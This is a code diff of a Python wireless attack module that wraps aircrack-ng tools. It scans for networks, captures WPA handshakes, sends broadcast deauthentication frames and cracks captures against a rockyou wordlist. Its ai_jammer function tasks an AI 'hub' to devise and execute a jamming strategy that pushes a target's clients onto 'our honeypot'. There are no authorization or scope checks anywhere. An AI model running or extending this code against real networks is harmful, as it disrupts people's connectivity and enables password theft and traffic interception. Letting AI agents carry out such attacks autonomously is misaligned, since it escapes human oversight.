@@ -3,44 +3,117 @@ Wireless Module — Apex Intelligence Build.
 Handles Aircrack-ng suite integration, WPA/WPA2 audits, and deauth attacks.
 """
 
+import subprocess
 from shadowcypher.core.module import BaseModule
 from shadowcypher.core.sanitize import validate_interface
+from shadowcypher.core.platform import platform_engine
+
 
 class Wireless(BaseModule):
     """The 'Wave' engine for wireless auditing."""
-    
+
     def __init__(self):
         super().__init__(module_name="wireless")
 
-    def _check_iface(self, iface):
+    @staticmethod
+    def _check_iface(iface):
         if not validate_interface(iface):
-            self.log(f"INVALID_INTERFACE: {iface}", "ERROR")
             return False
         return True
 
-    def scan_wifi(self, interface, on_output=None):
-        if not self._check_iface(interface): return
-        self.log(f"INITIATING_WIFI_SCAN: {interface}")
-        
-        # Using airodump-ng or similar
-        return self.execute(f"SCAN_{interface}", ["airodump-ng", interface], callback=on_output)
+    # ── Interface Management ──
 
-    def deauth_target(self, interface, bssid, client_mac="FF:FF:FF:FF:FF:FF", on_output=None):
-        if not self._check_iface(interface): return
-        self.log(f"DEAUTH_ATTACK: {bssid} -> {client_mac}")
-        
-        args = ["aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client_mac, interface]
-        return self.execute("DEAUTH", args, callback=on_output)
+    @staticmethod
+    def list_interfaces(on_output=None, on_complete=None):
+        """List all wireless interfaces and their state."""
+        from shadowcypher.core.runner import runner
+        if platform_engine.IS_LINUX:
+            cmd = ["iw", "dev"]
+        elif platform_engine.IS_MACOS:
+            cmd = ["networksetup", "-listallhardwareports"]
+        else:
+            cmd = ["netsh", "wlan", "show", "interfaces"]
+        return runner.execute_task("LIST_IFACES", cmd, callback=on_output)
 
-    def crack_wpa(self, cap_file, wordlist=None, on_output=None):
-        wordlist = wordlist or self.get_tool_path("rockyou")
-        self.log(f"CRACKING_WPA_HANDSHAKE: {cap_file}")
-        
+    @staticmethod
+    def enable_monitor(interface, on_output=None, on_complete=None):
+        """Enable monitor mode on a wireless interface."""
+        if not Wireless._check_iface(interface):
+            return
+        from shadowcypher.core.runner import runner
+        return runner.execute_task("MON_ON", ["airmon-ng", "start", interface], callback=on_output)
+
+    @staticmethod
+    def disable_monitor(interface, on_output=None, on_complete=None):
+        """Disable monitor mode on a wireless interface."""
+        if not Wireless._check_iface(interface):
+            return
+        from shadowcypher.core.runner import runner
+        return runner.execute_task("MON_OFF", ["airmon-ng", "stop", interface], callback=on_output)
+
+    # ── Scanning & Capture ──
+
+    @staticmethod
+    def scan_networks(interface, duration=30, on_output=None, on_complete=None):
+        """Scan for nearby wireless networks using airodump-ng."""
+        if not Wireless._check_iface(interface):
+            return
+        from shadowcypher.core.runner import runner
+        args = ["timeout", str(duration), "airodump-ng", interface, "--output-format", "csv"]
+        return runner.execute_task(f"SCAN_{interface}", args, callback=on_output)
+
+    @staticmethod
+    def scan_wifi(interface, on_output=None):
+        """Quick WiFi scan (legacy alias for scan_networks)."""
+        return Wireless.scan_networks(interface, duration=30, on_output=on_output)
+
+    @staticmethod
+    def capture_handshake(interface, bssid, channel=6, timeout=120, on_output=None, on_complete=None):
+        """Capture a WPA/WPA2 handshake from a target AP."""
+        if not Wireless._check_iface(interface):
+            return
+        from shadowcypher.core.runner import runner
+        cap_file = f"/tmp/shadowcypher_cap_{bssid.replace(':', '')}"
+        args = [
+            "timeout", str(timeout),
+            "airodump-ng",
+            "--bssid", bssid,
+            "--channel", str(channel),
+            "--write", cap_file,
+            interface,
+        ]
+        return runner.execute_task(f"CAPTURE_{bssid}", args, callback=on_output)
+
+    # ── Attacks ──
+
+    @staticmethod
+    def deauth(interface, bssid, client_mac=None, count=10, on_output=None, on_complete=None):
+        """Send deauthentication frames to disconnect clients from an AP."""
+        if not Wireless._check_iface(interface):
+            return
+        from shadowcypher.core.runner import runner
+        client = client_mac or "FF:FF:FF:FF:FF:FF"
+        args = ["aireplay-ng", "--deauth", str(count), "-a", bssid, "-c", client, interface]
+        return runner.execute_task("DEAUTH", args, callback=on_output)
+
+    @staticmethod
+    def deauth_target(interface, bssid, client_mac="FF:FF:FF:FF:FF:FF", on_output=None):
+        """Legacy alias for deauth."""
+        return Wireless.deauth(interface, bssid, client_mac, on_output=on_output)
+
+    @staticmethod
+    def crack_wpa(cap_file, wordlist=None, on_output=None, on_complete=None):
+        """Crack a WPA handshake capture file."""
+        from shadowcypher.core.runner import runner
+        wordlist = wordlist or "/usr/share/wordlists/rockyou.txt"
         args = ["aircrack-ng", "-w", wordlist, cap_file]
-        return self.execute("WPA_CRACK", args, callback=on_output)
+        return runner.execute_task("WPA_CRACK", args, callback=on_output)
 
-    def ai_jammer(self, bssid, on_output=None):
+    @staticmethod
+    def ai_jammer(bssid, on_output=None):
         """Escalate to Swarm for complex signal-jamming strategies."""
         from shadowcypher.core.hub import hub
-        self.log(f"AI_JAMMER_STRATEGY_INIT: {bssid}", "AI")
-        return hub.register_mission(f"Devise and execute a smart deauth/jamming strategy for AP {bssid} to force clients to our honeypot.")
+        return hub.register_mission(
+            f"Devise and execute a smart deauth/jamming strategy for AP {bssid} "
+            "to force clients to our honeypot."
+        )
